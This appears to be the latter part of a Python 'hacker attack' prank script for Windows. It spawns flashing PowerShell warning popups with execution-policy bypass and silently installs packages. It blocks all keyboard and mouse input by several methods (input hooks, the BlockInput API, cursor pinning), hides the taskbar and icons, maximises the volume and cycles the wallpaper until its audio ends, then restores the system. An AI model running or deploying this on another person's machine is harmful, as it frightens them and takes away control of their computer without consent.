$threatLabel.Font = New-Object System.Drawing.Font("Consolas", 12, [System.Drawing.FontStyle]::Bold)
$threatLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 0, 0)
$threatLabel.Location = New-Object System.Drawing.Point(0, 320)
$threatLabel.Size = New-Object System.Drawing.Size(692, 22)
$threatLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$innerPanel.Controls.Add($threatLabel)

# Enhanced blinking effect for warning icon (more dramatic)
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 300
$script:blink = $true
$timer.Add_Tick({
    if ($script:blink) {
        $iconLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 0, 0)
        $iconLabel.Font = New-Object System.Drawing.Font("Consolas", 20, [System.Drawing.FontStyle]::Bold)
    } else {
        $iconLabel.ForeColor = [System.Drawing.Color]::FromArgb(100, 0, 0)
        $iconLabel.Font = New-Object System.Drawing.Font("Consolas", 18, [System.Drawing.FontStyle]::Bold)
    }
    $script:blink = -not $script:blink
})
$timer.Start()

# Pulsing glow effect on border
$glowTimer = New-Object System.Windows.Forms.Timer
$glowTimer.Interval = 500
$script:glowIntensity = 0
$glowTimer.Add_Tick({
    $script:glowIntensity = ($script:glowIntensity + 1) %% 3
    switch ($script:glowIntensity) {
        0 { $glowPanel.BackColor = [System.Drawing.Color]::FromArgb(0, 255, 65) }
        1 { $glowPanel.BackColor = [System.Drawing.Color]::FromArgb(0, 200, 50) }
        2 { $glowPanel.BackColor = [System.Drawing.Color]::FromArgb(0, 150, 40) }
    }
})
$glowTimer.Start()

$form.Show()
[System.Windows.Forms.Application]::Run($form)
''' % (x, y, title, message)
        
        popup_process = subprocess.Popen(
            ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        popup_processes.append(popup_process)
        time.sleep(0.5)
    
    print("    [OK] 10 hacker popups distributed across all monitors!")

# ============================================
# 8. DISABLE INPUT (Multi-Method, 100% Reliable)
# ============================================
class HackerInputBlocker:
    """Multi-method input blocker for hacker attack."""
    def __init__(self):
        self.mouse_listener = None
        self.keyboard_listener = None
        self.keyboard_hook = None
        self.mouse_hook = None
        self.hook_proc_keyboard = None
        self.hook_proc_mouse = None
        self.blocking_thread = None
        self.pyautogui_thread = None
        self.blockinput_active = False
        self.method_used = None
    
    def method_pynput(self):
        """Try blocking with pynput (no admin needed)."""
        try:
            try:
                from pynput import keyboard, mouse
            except ImportError:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput", "-q"],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                from pynput import keyboard, mouse
            
            # Create listeners with suppress=True to block input
            self.mouse_listener = mouse.Listener(suppress=True)
            self.keyboard_listener = keyboard.Listener(suppress=True)
            
            # Start listeners
            self.mouse_listener.start()
            self.keyboard_listener.start()
            
            # Wait a bit to ensure they're running
            time.sleep(0.5)
            
            # Verify they're actually running
            if self.mouse_listener.running and self.keyboard_listener.running:
                self.method_used = "pynput"
                # Keep listeners alive by joining them in a separate thread
                def keep_listeners_alive():
                    try:
                        if self.mouse_listener:
                            self.mouse_listener.join()
                        if self.keyboard_listener:
                            self.keyboard_listener.join()
                    except:
                        pass
                
                listener_thread = threading.Thread(target=keep_listeners_alive, daemon=True)
                listener_thread.start()
                return True
        except Exception as e:
            pass
        return False
    
    def stop_pynput(self):
        try:
            if self.mouse_listener:
                self.mouse_listener.stop()
            if self.keyboard_listener:
                self.keyboard_listener.stop()
        except:
            pass
    
    def method_blockinput(self):
        """Try blocking with Windows BlockInput API."""
        try:
            result = ctypes.windll.user32.BlockInput(True)
            if result:
                self.method_used = "blockinput"
                self.blockinput_active = True
                return True
        except:
            pass
        return False
    
    def stop_blockinput(self):
        try:
            if self.blockinput_active:
                ctypes.windll.user32.BlockInput(False)
                self.blockinput_active = False
        except:
            pass
    
    def method_windows_hooks(self):
        """Try blocking with direct Windows API hooks."""
        try:
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            
            def low_level_keyboard_proc(nCode, wParam, lParam):
                if nCode >= HC_ACTION:
                    return 1  # Block the key
                return user32.CallNextHookExW(self.keyboard_hook, nCode, wParam, lParam)
            
            def low_level_mouse_proc(nCode, wParam, lParam):
                if nCode >= HC_ACTION:
                    return 1  # Block the event
                return user32.CallNextHookExW(self.mouse_hook, nCode, wParam, lParam)
            
            # Define hook procedure types
            if ctypes.sizeof(ctypes.c_void_p) == 8:  # 64-bit
                WPARAM = ctypes.c_ulonglong
                LPARAM = ctypes.c_longlong
            else:  # 32-bit
                WPARAM = ctypes.c_ulong
                LPARAM = ctypes.c_long
            
            HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, WPARAM, LPARAM)
            
            self.hook_proc_keyboard = HOOKPROC(low_level_keyboard_proc)
            self.hook_proc_mouse = HOOKPROC(low_level_mouse_proc)
            
            self.keyboard_hook = user32.SetWindowsHookExW(
                WH_KEYBOARD_LL, self.hook_proc_keyboard,
                kernel32.GetModuleHandleW(None), 0
            )
            
            self.mouse_hook = user32.SetWindowsHookExW(
                WH_MOUSE_LL, self.hook_proc_mouse,
                kernel32.GetModuleHandleW(None), 0
            )
            
            if self.keyboard_hook and self.mouse_hook:
                self.method_used = "windows_hooks"
                
                def message_loop():
                    try:
                        while input_blocking_active:
                            msg = MSG()
                            bRet = user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 0x0001)
                            if bRet:
                                msg = MSG()
                                bRet = user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
                                if bRet == 0 or bRet == -1:
                                    break
                                user32.TranslateMessage(ctypes.byref(msg))
                                user32.DispatchMessageW(ctypes.byref(msg))
                            else:
                                time.sleep(0.01)
                    except:
                        pass
                
                self.blocking_thread = threading.Thread(target=message_loop, daemon=True)
                self.blocking_thread.start()
                time.sleep(0.5)
                return True
        except:
            pass
        return False
    
    def stop_windows_hooks(self):
        try:
            if self.keyboard_hook:
                ctypes.windll.user32.UnhookWindowsHookExW(self.keyboard_hook)
                self.keyboard_hook = None
            if self.mouse_hook:
                ctypes.windll.user32.UnhookWindowsHookExW(self.mouse_hook)
                self.mouse_hook = None
        except:
            pass
    
    def method_pyautogui(self):
        """Try blocking with pyautogui (last resort)."""
        try:
            try:
                import pyautogui
            except ImportError:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui", "-q"],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                import pyautogui
            
            pyautogui.FAILSAFE = False
            screen_width, screen_height = pyautogui.size()
            center_x, center_y = screen_width // 2, screen_height // 2
            
            def continuous_block():
                while input_blocking_active:
                    try:
                        pyautogui.moveTo(center_x, center_y, duration=0)
                        time.sleep(0.01)
                    except:
                        pass
            
            self.pyautogui_thread = threading.Thread(target=continuous_block, daemon=True)
            self.pyautogui_thread.start()
            time.sleep(0.5)
            
            self.method_used = "pyautogui"
            return True
        except:
            pass
        return False
    
    def stop_pyautogui(self):
        pass  # Thread stops when input_blocking_active = False
    
    def block(self):
        """Start blocking using best available method."""
        global input_blocking_active
        
        print("[8] Disabling input until attack completes...")
        print("    Trying multiple methods for maximum compatibility...")
        
        methods = [
            ("pynput", self.method_pynput, self.stop_pynput),
            ("blockinput", self.method_blockinput, self.stop_blockinput),
            ("windows_hooks", self.method_windows_hooks, self.stop_windows_hooks),
            ("pyautogui", self.method_pyautogui, self.stop_pyautogui),
        ]
        
        active_methods = []
        
        for method_name, try_method, stop_method in methods:
            if try_method():
                active_methods.append((method_name, stop_method))
                if method_name in ["pynput", "blockinput", "windows_hooks"]:
                    break  # Strong method found
        
        if not active_methods:
            print("    [!] All blocking methods failed - input may not be fully blocked")
            return False
        
        print("    [OK] Input blocked using: %s" % ', '.join([m[0] for m in active_methods]))
        
        # Wait while blocking is active - keep checking and verifying blocking is still active
        while input_blocking_active:
            time.sleep(0.1)
            # Verify blocking is still active (especially for pynput)
            if self.method_used == "pynput":
                if self.mouse_listener and not self.mouse_listener.running:
                    # Restart if it stopped
                    try:
                        from pynput import mouse
                        self.mouse_listener = mouse.Listener(suppress=True)
                        self.mouse_listener.start()
                    except:
                        pass
                if self.keyboard_listener and not self.keyboard_listener.running:
                    # Restart if it stopped
                    try:
                        from pynput import keyboard
                        self.keyboard_listener = keyboard.Listener(suppress=True)
                        self.keyboard_listener.start()
                    except:
                        pass
        
        # Stop all active methods
        print("    [*] Stopping input blocking...")
        for method_name, stop_method in active_methods:
            try:
                stop_method()
            except:
                pass
        
        print("    [OK] Input re-enabled!")
        return True

def disable_input_loop():
    """Main function to disable input using multi-method approach."""
    blocker = HackerInputBlocker()
    blocker.block()

# ============================================
# CLOSE ALL POPUPS
# ============================================
def close_all_popups():
    """Close all hacker popup windows"""
    global popup_processes
    
    print("[*] Closing all popup windows...")
    
    # Close tracked popup processes
    for process in popup_processes:
        try:
            if process.poll() is None:  # Still running
                process.terminate()
                time.sleep(0.2)
                if process.poll() is None:  # Still running
                    process.kill()
        except:
            pass
    
    # Use PowerShell to find and close all popup windows by their characteristics
    # (Windows Forms with green border, no title bar, hacker theme)
    ps_script = '''
# Close all forms with hacker theme (green border, no title)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Get all open forms
$forms = [System.Windows.Forms.Application]::OpenForms
$closed = 0
foreach ($form in $forms) {
    try {
        # Check if it's a hacker popup (green border, no title, specific size)
        if (($form.FormBorderStyle -eq [System.Windows.Forms.FormBorderStyle]::None) -and
            ($form.Size.Width -eq 700 -or $form.Size.Height -eq 350) -and
            ($form.BackColor -eq [System.Drawing.Color]::FromArgb(0, 255, 65) -or
             $form.TopMost -eq $true)) {
            $form.Close()
            $form.Dispose()
            $closed++
        }
    } catch {}
}

# Kill PowerShell processes that might be running popup scripts
# Find processes with System.Windows.Forms in command line
Get-WmiObject Win32_Process -Filter "name='powershell.exe'" | ForEach-Object {
    try {
        $cmdLine = $_.CommandLine
        if ($cmdLine -and (
            $cmdLine -like "*System.Windows.Forms.Form*" -or
            $cmdLine -like "*FormBorderStyle*None*" -or
            $cmdLine -like "*BackColor*FromArgb*0,255,65*")) {
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
            $closed++
        }
    } catch {}
}

Write-Output "Closed $closed popup windows"
'''
    
    try:
        result = subprocess.run(
            ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
            capture_output=True,
            timeout=5,
            text=True
        )
        if result.stdout:
            print(f"    [*] {result.stdout.strip()}")
    except:
        pass
    
    # Small delay to ensure windows close
    time.sleep(0.5)
    
    print("    [OK] All popups closed!")

# ============================================
# CLOSE ALL MATRIX TERMINALS
# ============================================
def close_all_matrix_terminals():
    """Close all matrix terminal windows"""
    print("[*] Closing all matrix terminals...")
    
    # Update flag file to signal terminals to stop
    flag_file = os.path.join(tempfile.gettempdir(), "hacker_attack_active.flag")
    try:
        with open(flag_file, 'w') as f:
            f.write("0")
    except:
        pass
    
    # Kill all cmd.exe processes running matrix scripts
    ps_script = '''
# Kill cmd.exe processes running matrix scripts
Get-WmiObject Win32_Process -Filter "name='cmd.exe'" | ForEach-Object {
    try {
        $cmdLine = $_.CommandLine
        if ($cmdLine -and (
            $cmdLine -like "*matrix_hacker.py*" -or
            $cmdLine -like "*color 0a*")) {
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}

# Also kill any Python processes running matrix script
Get-WmiObject Win32_Process -Filter "name='python.exe'" | ForEach-Object {
    try {
        $cmdLine = $_.CommandLine
        if ($cmdLine -and $cmdLine -like "*matrix_hacker.py*") {
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}
'''
    
    try:
        subprocess.run(
            ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
            capture_output=True,
            timeout=3
        )
    except:
        pass
    
    print("    [OK] All matrix terminals closed!")

# ============================================
# RESTORE EVERYTHING
# ============================================
def restore_everything():
    global input_blocking_active
    
    print("\n" + "=" * 60)
    print("   RESTORING SYSTEM...")
    print("=" * 60)
    
    # Stop input blocking
    print("[*] Re-enabling input...")
    input_blocking_active = False
    time.sleep(0.3)
    
    # Close ALL terminals and popups TOGETHER IMMEDIATELY
    print("[*] Closing all terminals and popups immediately...")
    
    # Start both closing operations in parallel threads
    close_threads = [
        threading.Thread(target=close_all_matrix_terminals, name="CloseTerminals"),
        threading.Thread(target=close_all_popups, name="ClosePopups"),
    ]
    
    for t in close_threads:
        t.start()
    
    # Wait for both to complete
    for t in close_threads:
        t.join(timeout=3)
    
    print("    [OK] All terminals and popups closed!")
    
    # Show taskbar
    print("[*] Showing taskbar...")
    show_taskbar()
    
    # Show desktop icons
    print("[*] Showing desktop icons...")
    show_desktop_icons()
    
    print("\n[OK] System restored!")

# ============================================
# MAIN - RUN EVERYTHING SIMULTANEOUSLY
# ============================================
def main():
    global input_blocking_active
    
    print("\n" + "=" * 60)
    print("   ATTACK INITIATED!")
    print("=" * 60 + "\n")
    
    # FIRST: Start audio IMMEDIATELY at the very start (no matter what!)
    print("[*] Starting audio playback IMMEDIATELY...")
    audio_thread = threading.Thread(target=play_attack_audio, name="Audio")
    audio_thread.start()
    time.sleep(0.2)  # Small delay to ensure audio starts
    
    # SECOND: Minimize all windows to show desktop
    minimize_all_windows()
    time.sleep(0.3)
    
    # THIRD: Max volume!
    max_volume()
    
    # FOURTH: Start input blocking in background thread (NOT daemon - must stay alive)
    input_thread = threading.Thread(target=disable_input_loop, daemon=False, name="InputBlocker")
    input_thread.start()
    time.sleep(0.5)  # Give it more time to initialize
    
    # FIFTH: Hide icons, hide taskbar, and change wallpaper (while audio is playing)
    print("[*] Setting up desktop (icons, taskbar, wallpaper)...")
    hide_desktop_icons()
    hide_taskbar()
    # Start wallpaper cycling in background (it will continue)
    wallpaper_thread = threading.Thread(target=cycle_wallpaper, name="Wallpaper")
    wallpaper_thread.start()
    time.sleep(0.3)
    
    # SIXTH: Start other effects in parallel (matrix terminals, popups) while audio plays
    print("[*] Starting matrix terminals and popups...")
    other_threads = [
        threading.Thread(target=launch_matrix_terminals, name="Matrix"),
        threading.Thread(target=show_popups, name="Popups"),
    ]
    
    for t in other_threads:
        t.start()
        time.sleep(0.1)
    
    # Wait for Audio thread to complete - ATTACK STOPS IMMEDIATELY WHEN AUDIO ENDS
    audio_thread.join()  # Wait for audio to finish (~38 seconds)
    
    # Audio has ended - STOP ATTACK IMMEDIATELY (no waiting for other threads)
    print("\n[*] Audio ended - stopping attack immediately...")
    input_blocking_active = False
    
    # Small delay to ensure threads see the flag change
    time.sleep(0.5)
    
    # RESTORE EVERYTHING IMMEDIATELY
    restore_everything()
    
    print("\n" + "=" * 60)
    print("   HACKER ATTACK COMPLETE!")
    print("=" * 60)
    print("\nWallpaper has been set to Photos/1.jpg")
    print("=" * 60)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Attack aborted!")
        # Try to restore on abort
        try:
            input_blocking_active = False
            show_taskbar()
            show_desktop_icons()
        except:
            pass
